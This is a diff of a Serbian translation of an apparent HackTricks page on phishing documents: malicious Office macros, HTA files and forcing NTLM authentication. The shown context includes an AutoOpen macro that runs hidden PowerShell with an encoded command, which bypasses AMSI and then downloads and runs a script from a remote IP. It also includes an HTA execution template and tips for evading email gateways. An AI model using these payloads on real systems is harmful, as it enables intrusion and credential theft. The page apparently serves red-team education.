@@ -1,50 +1,48 @@
-# Phishing fajlovi i dokumenti
+# Fajlovi i Dokumenti za Ribarenje
 
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite vašu **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Office Dokumenti
 
-Microsoft Word vrši validaciju podataka fajla pre otvaranja. Validacija podataka se vrši u formi identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako se tokom identifikacije strukture podataka javi bilo kakva greška, analizirani fajl se neće otvoriti.
+Microsoft Word vrši validaciju podataka fajla pre otvaranja fajla. Validacija podataka se vrši u obliku identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.
 
-Obično, Word fajlovi koji sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati fajl promenom ekstenzije i i dalje zadržati mogućnost izvršavanja makroa.\
+Obično, Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije fajla i dalje zadržati sposobnosti izvršavanja makroa.\
 Na primer, RTF fajl ne podržava makroe, po dizajnu, ali DOCM fajl preimenovan u RTF će biti obrađen od strane Microsoft Word-a i biće sposoban za izvršavanje makroa.\
-Isti interni mehanizmi se primenjuju na sve softvere iz Microsoft Office Suite-a (Excel, PowerPoint itd.).
+Isti interni mehanizmi se primenjuju na sve softvere Microsoft Office paketa (Excel, PowerPoint itd.).
 
 Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršene od strane nekih Office programa:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX fajlovi koji referenciraju udaljeni šablon (File –Options –Add-ins –Manage: Templates –Go) koji uključuje makroe takođe mogu "izvršiti" makroe.
+### Eksterni Učitavanje Slike
 
-### Učitavanje spoljne slike
+Idi na: _Umetanje --> Brze delove --> Polje_\
+_**Kategorije**: Linkovi i Reference, **Nazivi polja**: includePicture, i **Naziv fajla ili URL**:_ http://\<ip>/bilošta
 
-Idi na: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+![](<../../.gitbook/assets/image (152).png>)
 
-![](<../../.gitbook/assets/image (316).png>)
-
-### Makroi zadnja vrata
+### Makroi Pozadinska Vrata
 
 Moguće je koristiti makroe za pokretanje proizvoljnog koda iz dokumenta.
 
 #### Autoload funkcije
 
-Što su češće, to je veća verovatnoća da će ih AV detektovati.
+Što su češći, to je veća verovatnoća da će ih AV otkriti.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Primeri koda makroa
+#### Primeri Koda Makroa
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -78,10 +76,10 @@ proc.Create "powershell <beacon line generated>
 
 Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored **Document Properties and Personal Information**.
 
-#### Doc ekstenzija
+#### Doc Ekstenzija
 
-Kada završite, izaberite padajući meni **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
-Ovo radite zato što **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** oko makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima veliki `!` i neki web/email gateway ih potpuno blokiraju). Stoga, ova **starija `.doc` ekstenzija je najbolji kompromis**.
+Kada završite, izaberite opciju **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
+Ovo uradite jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** oko ekstenzije sa makroima **`.docm`** (npr. ikona sličica ima veliko `!` i neki web/email gateway ih potpuno blokiraju). Zbog toga je **ovaj stariji `.doc` format najbolji kompromis**.
 
 #### Generatori zlonamernih makroa
 
@@ -89,11 +87,11 @@ Ovo radite zato što **ne možete sačuvati makroe unutar `.docx`** i postoji **
 * [**macphish**](https://github.com/cldrn/macphish)
 * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA fajlovi
+## HTA Fajlovi
 
 HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno pouzdana" aplikacija, bez ograničenja sigurnosnog modela pregledača.
 
-HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorerom**, čineći **`mshta` zavisan od IE-a**. Dakle, ako je deinstaliran, HTA fajlovi neće moći da se izvrše.
+HTA se izvršava pomoću **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorerom**, čineći **`mshta` zavistan od IE-a**. Dakle, ako je deinstaliran, HTA fajlovi neće moći da se izvrše.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -148,9 +146,9 @@ var_func
 self.close
 </script>
 ```
-## Forciranje NTLM autentifikacije
+## Prisiljavanje NTLM autentikacije
 
-Postoji nekoliko načina da se **"udaljeno" prisili NTLM autentifikacija**, na primer, možete dodati **nevidljive slike** u e-poštu ili HTML kojem će korisnik pristupiti (čak i HTTP MitM?). Ili pošaljite žrtvi **adresu datoteka** koje će **pokrenuti** autentifikaciju samo za **otvaranje fascikle**.
+Postoje nekoliko načina da se **prisili NTLM autentikacija "na daljinu"**, na primer, možete dodati **nevidljive slike** u e-poštu ili HTML koje će korisnik pristupiti (čak i HTTP MitM?). Ili poslati žrtvi **adresu datoteka** koje će **pokrenuti** **autentikaciju** samo za **otvaranje fascikle.**
 
 **Proverite ove ideje i još mnogo toga na sledećim stranicama:**
 
@@ -162,21 +160,21 @@ Postoji nekoliko načina da se **"udaljeno" prisili NTLM autentifikacija**, na p
 [places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
 {% endcontent-ref %}
 
-### NTLM Relay
+### NTLM Prenos
 
-Ne zaboravite da ne samo da možete ukrasti heš ili autentifikaciju, već i **izvršiti napade NTLM relay**:
+Ne zaboravite da ne samo da možete ukrasti heš ili autentikaciju već i **izvršiti napade prenosa NTLM-a**:
 
-* [**Napadi NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**Napadi prenosa NTLM-a**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (NTLM prenos na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li videti **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
